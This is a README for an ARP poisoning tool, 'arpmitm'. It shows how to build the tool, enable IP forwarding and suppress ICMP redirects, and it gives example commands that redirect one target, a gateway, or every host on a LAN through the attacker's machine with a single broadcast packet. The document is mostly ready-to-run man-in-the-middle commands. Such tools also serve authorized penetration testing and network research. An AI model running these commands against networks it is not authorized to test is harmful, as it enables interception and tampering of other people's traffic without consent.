# ARP Man-in-the-Middle

A tool to redirect hosts on a local network to your own computer (to intercept the traffic - aka ARP poisoning).

**Install:**
```sh
./configure --enable-static \
&& make all
```

Setup:
```sh
echo 1 >/proc/sys/net/ipv4/ip_forward
echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects
iptables -L FORWARD -vn
```

**Example 1:**

Redirects all traffic between the target '10.0.1.111' and the Internet through us.
```sh
arpmitm -t 10.0.1.111
```

Longer version doing exactly the same:
```sh
arpmim -v 00:02:13:37:73:50 10.0.1.254:11:11:22:22:33:33 10.0.1.111:44:44:55:55:66:66
```

**Example 2:**

Tells the gateway (10.0.1.254) to redirect all traffic to .111 and .222 via us (00:02:13:37:73:50). Traffic from .111 and .222 traffic towards the gaterway is _not_ redirected (-A).
```sh
arpmim -v -A 00:02:13:37:73:50 10.0.1.254:11:11:22:22:33:33 10.0.1.111 10.0.1.222
```

**Example 3:**

Use 1 broadcast packet to tell *everyone* that 10.0.1.254 is us.
```sh
arpmitm 00:02:13:37:73:50 255.255.255.255 10.0.1.254
```

**Example 4 the bold:**

Redirect all local traffic between the 4 hosts through us.
```sh
arpmitm -A 00:02:13:37:73:50 255.255.255.255 10.0.0.1 10.0.0.2 10.0.0.3 10.0.0.4
```

**Features:**
- Auto-Mode
- Broadcast Mode: Send 1 ARP-broadcast to ALL hosts and redirect ALL hosts with a single packet (be warned!)

**Supported Platforms:**
1. Linux
1. MacOS
1. FreeBSD
